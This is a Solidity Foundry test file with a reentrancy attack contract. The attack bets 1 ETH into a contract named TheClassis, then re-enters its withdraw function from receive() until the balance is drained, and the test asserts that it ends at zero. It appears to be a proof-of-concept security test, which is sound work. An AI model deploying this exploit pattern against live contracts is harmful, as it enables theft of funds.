// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import "../src/TheClassis.sol";  // Import the vulnerable TheClassis contract

contract ReentrancyAttack {
    TheClassis public target;
    
    constructor(address _target) {
        target = TheClassis(payable(_target));
    }
    
    // Fallback function for receiving ETH during reentrancy
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            console.log("Reentering withdraw, contract balance:", address(target).balance);
            target.withdraw();  // Re-enter the withdraw function
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        target.bet{value: 1 ether}();  // Bet to get some balance in the contract
        console.log("Starting attack, contract balance before withdraw:", address(target).balance);
        target.withdraw();  // Trigger the reentrancy attack
        console.log("Attack completed, contract balance after withdraw:", address(target).balance);
    }
}


// to run the test: forge test --match-contract TheClassisTest -vvvv
contract TheClassisTest is Test {
    TheClassis public classis;
    ReentrancyAttack public attacker;

    function setUp() public {
        // Deploy the vulnerable contract directly
        classis = new TheClassis();

        // Fund the contract with 5 ether
        vm.deal(address(classis), 10 ether);

        // Deploy the attacker contract targeting TheClassis
        attacker = new ReentrancyAttack(address(classis));

        // Log the initial balance of the contract
        console.log("TheClassis contract funded with 10 ETH, initial balance:", address(classis).balance);
    }

    function testReentrancyAttack() public {
        // Start the reentrancy attack
        vm.deal(address(attacker), 1 ether);  // Fund attacker with 1 ETH
        console.log("Attacker balance before attack:", address(attacker).balance);
        attacker.attack{value: 1 ether}();  // Execute the attack

        // Log the final contract balance
        console.log("Final contract balance after attack:", address(classis).balance);

        //log attacker balance after attack
        console.log("Attacker balance after exploit:" , address(attacker).balance);

        // Check if the contract has been drained
        assertEq(address(classis).balance, 0);
    }
}
